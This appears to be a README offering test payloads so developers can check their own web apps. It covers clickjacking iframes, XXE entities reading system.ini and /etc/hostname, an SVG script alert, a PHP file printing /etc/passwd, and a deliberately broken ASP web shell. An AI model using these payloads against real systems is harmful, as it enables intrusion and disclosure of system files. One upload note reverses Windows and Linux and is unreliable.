We will not be hosting files because most people cannot download vulnerable files off github from company networks.
Please understand how these files work before utilizing them.


### Clickjacking
Put the link to your site into the iframe section at the bottom of each file, then save as an html file. Log in to your application, then double click on the following html file so that it opens in the same browser. If you can see your website in the iframe, this proves your application is vulnerable to clickjacking.

The following files come from PortSwigger: https://portswigger.net/web-security/clickjacking

**Basic: test1.html**
```
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: .2;
        z-index: 2;
    }
    div {
        position:absolute;
        top:100px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://www.yourSiteHere.com/dashboard"></iframe>
```

**Frame busting: test2.html**
```
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: .2;
        z-index: 2;
    }
    div {
        position:absolute;
        top:100px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="https://www.yourSiteHere.com/dashboard"></iframe>
```



Before testing the files below, try uploading calc.exe from a Windows computer. If it successfully uploads, start the remediation procedures. If calc.exe does not upload, or if you want to test further, attempt to upload the files below.

### XXE
**XXE File: Test.xml**
Please note that the file called below should be replaced with a valid Linux file if the Web Server is Linux based.
```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ELEMENT test ANY >
<!ENTITY test SYSTEM "file:///c:/Windows/system.ini" >]><test>&test;</test>
```

**SVG File: test.svg**
https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
### XSS
**SVG file: testabc.svg**
https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j
```
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
<rect width="124" height="124" rx="24" fill="#000000"/>
   <script type="text/javascript">  
      alert(0x539);
   </script>
</svg>
```

**PDF File: XSSinPDF.pdf**
https://portswigger.net/research/portable-data-exfiltration

https://owasp.org/www-chapter-belgium/assets/2007/2007-06-22/OWASP_BeLux_2007-06-22_Protecting_Web_Applications_from_Universal_PDF_XSS.pdf

Known benign XSSinPDF to download: https://github.com/ynsmroztas/pdfsvgxsspayload/blob/main/poc.pdf

### Remote Code Execution
These files should be deleted immediately after testing. Leaving these files on your web server could lead to true impact.

**PHP File Upload: file1.php**
Please note that the file called below should be replaced with a valid Windows file if the Web Server is Linux based.

```
<?php echo file_get_contents('/etc/passwd'); ?>
```
**asp Web Shell: test.asp**
The file below is a butchered version of the file linked below. This version is broken to reduce potential impact if a developer uses it incorrectly or keeps the file uploaded on the web server. If you would like to use a working version of this script, visit the link below. For testing purposes, you do not need a working version.

Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asp

```
<%
Server.ScriptTimeout = 180

ip=request.ServerVariables("REMOTE_ADDR")
if ip<>"1.2.3.4" then
 response.Status="404 Page Not Found"
 response.Write(response.Status)
 response.End
end if

if Request.Form("submit") <> "" then
   Dim wshell, intReturn, strPResult
   cmd = Request.Form("cmd")
   Response.Write ("Running command: " & cmd & "<br />")
   Set objCmd = wShell.Exec(cmd)
   response.write "<br><pre>" & replace(replace(strPResult,"<","&lt;"),vbCrLf,"<br>") & "</pre>"
   set wshell = nothing
end if

%>
<html>
<body onload="document.shell.cmd.focus()">
<form action="shell.asp" method="POST" name="shell">
<input type="submit" name="submit" value="Submit" />
%ComSpec% /c dir
</form>
<hr/>
</body>
</html>
```